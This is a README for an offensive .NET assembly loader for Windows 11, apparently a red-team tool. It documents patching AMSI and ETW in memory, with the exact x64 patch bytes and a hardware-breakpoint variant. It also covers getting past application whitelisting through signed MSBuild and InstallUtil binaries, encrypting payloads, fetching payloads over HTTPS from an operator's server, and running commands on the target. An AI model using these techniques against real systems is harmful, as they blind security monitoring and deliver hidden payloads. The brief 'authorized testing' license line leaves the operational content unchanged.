# Shrimp Loader

In-memory .NET assembly loader for Windows 11. Reflectively loads and executes .NET assemblies without touching disk, using the CLR Hosting API — the same core technique behind `execute-assembly` in commercial C2 frameworks.

## How It Works

The CLR Hosting API allows an unmanaged process to load the .NET runtime and execute managed code from raw byte arrays. `Assembly.Load(byte[])` never writes the assembly to disk.

```
Unmanaged Host Process
  │
  ├─ Patch EtwEventWrite        ← kill .NET runtime telemetry
  ├─ CLRCreateInstance()        ← get CLR metahost
  ├─ GetRuntime("v4.0.30319")  ← target .NET 4.x
  ├─ ICorRuntimeHost::Start()  ← start the CLR (loads amsi.dll)
  ├─ Patch AmsiScanBuffer      ← prevent Assembly.Load scanning
  ├─ CreateDomain()            ← isolated AppDomain
  ├─ AppDomain.Load(byte[])   ← assembly loaded IN MEMORY
  ├─ EntryPoint.Invoke()       ← execute
  ├─ UnloadDomain()            ← cleanup loaded assembly metadata
  └─ SecureZeroMemory()        ← wipe decrypted bytes
```

## Components

### Loaders (C++ — cross-compile from macOS/Linux with MinGW)

| File | Description |
|------|-------------|
| `mingw_loader.cpp` | Basic CLR host, all COM interfaces defined inline, no MSVC dependencies |
| `loader_patched.cpp` | Full chain with AMSI + ETW bypass (direct patch or hardware breakpoints) |
| `loader_embedded.cpp` | Payload baked into the binary as XOR-encrypted byte array |
| `loader_https.cpp` | Fetches encrypted payload over HTTPS at runtime via WinHTTP |
| `patches.h` | AMSI/ETW bypass primitives — direct memory patch and hardware breakpoint variants |

### LOLBin Payloads (bypass application whitelisting)

| File | Description |
|------|-------------|
| `msbuild_payload.csproj` | MSBuild inline task — full chain in XML, executed by Microsoft-signed MSBuild.exe |
| `installutil_payload.cs` | InstallUtil payload — compile with Mono, run via Microsoft-signed InstallUtil.exe |
| `assembly_loader.cs` | Managed C# loader with named pipe and TCP delivery channels |

### Tooling

| File | Description |
|------|-------------|
| `build_msbuild.py` | One-command build: encrypts assembly and injects into MSBuild template |
| `encrypt_payload.py` | XOR/AES encryptor — outputs C# byte arrays, raw binary, or hex |
| `pipe_client.py` | Operator-side named pipe client for sending assemblies to the pipe listener |

### Reference (MSVC-only)

| File | Description |
|------|-------------|
| `clr_host_loader.cpp` | CLR host using `#import mscorlib.tlb` (requires MSVC + TLB) |
| `inline_execute.cpp` | CLR host using IDispatch late-binding (portable but references MSVC headers) |

## Quick Start

### Prerequisites

```bash
# macOS
brew install mingw-w64    # C++ cross-compiler
brew install mono          # C# compiler (for InstallUtil payload)

# Linux
apt install mingw-w64 mono-devel
```

### Build

```bash
# Build all C++ loaders (64-bit)
make

# Individual targets
make patched     # loader with AMSI/ETW bypass
make embedded    # embedded payload loader
make https       # HTTPS fetch loader
make installutil # compile InstallUtil C# payload

# 32-bit variants
make all32
```

### MSBuild Payload (recommended for targets with application whitelisting)

```bash
# One command: encrypt + inject into MSBuild template
python build_msbuild.py Seatbelt.exe -- -group=all

# On target:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_ready.csproj
```

### Embedded Payload

```bash
# Encrypt the assembly
python encrypt_payload.py xor YourTool.exe --format cs

# Paste output into loader_embedded.cpp or loader_patched.cpp, then:
make patched
```

### HTTPS Fetch

Edit `loader_https.cpp` — set `downloadHost`, `downloadPath`, and `xorKey`, then:

```bash
make https
```

Host the encrypted payload on your server:

```bash
python encrypt_payload.py xor YourTool.exe --format bin -o payload.bin
# Upload payload.bin to your server
```

## AMSI/ETW Bypass

`patches.h` provides two approaches:

| Method | How | Trade-off |
|--------|-----|-----------|
| `PATCH_DIRECT` | Overwrites function prologue bytes in memory | Simpler; EDR may monitor VirtualProtect on amsi.dll/ntdll.dll pages |
| `PATCH_HWBP` | Sets hardware breakpoints (DR0-DR3) + vectored exception handler | No memory writes to monitored DLLs; harder to detect |

Toggle in `loader_patched.cpp`:

```cpp
static const PatchMethod BYPASS_METHOD = PATCH_DIRECT;  // or PATCH_HWBP
```

### Patch Details

**AMSI** — patches `AmsiScanBuffer` to return `E_INVALIDARG`:
```
x64: B8 57 00 07 80 C3    (mov eax, 0x80070057; ret)
```

**ETW** — patches `EtwEventWrite` to return `STATUS_SUCCESS`:
```
x64: 33 C0 C3             (xor eax, eax; ret)
```

## Execution Order

The order matters:

1. **Patch ETW** — before CLR starts, prevents .NET runtime telemetry
2. **Start CLR** — `LoadLibrary("mscoree.dll")` + `ICorRuntimeHost::Start()`
3. **Patch AMSI** — after CLR start (amsi.dll is now loaded as a side effect)
4. **Decrypt payload** — XOR/AES decrypt into VirtualAlloc'd buffer
5. **AppDomain.Load(byte[])** — AMSI patched, won't scan
6. **EntryPoint.Invoke()** — ETW patched, won't log
7. **Wipe + UnloadDomain** — SecureZeroMemory, VirtualFree, unload AppDomain

## Cross-Compilation Notes

All C++ loaders are designed to compile with MinGW-w64 without any Windows SDK or MSVC dependency:

- COM interfaces declared inline with correct vtable layouts
- `mscoree.dll` loaded dynamically via `LoadLibrary`/`GetProcAddress` (no import lib needed)
- `winhttp.dll` loaded dynamically in the HTTPS variant
- Only link-time dependencies: `-loleaut32 -lole32` (always available in MinGW)
- `-municode` flag for `wmain` wide-string entry point
- `-static-libgcc -static-libstdc++` for standalone binaries

## Operational Notes

- .NET Framework 4.8.x ships with Windows 11 — the `v4.0.30319` runtime works out of the box
- For .NET 5/6/7/8+ assemblies, you need the CoreCLR `hostfxr` hosting API instead
- Always use `CreateDomain()` / `UnloadDomain()` rather than the default AppDomain for isolation
- The `build_msbuild.py` script uses `--` to separate loader options from assembly arguments
- MSBuild and InstallUtil payloads include the full AMSI + ETW bypass chain

## License

For authorized security testing and research only.
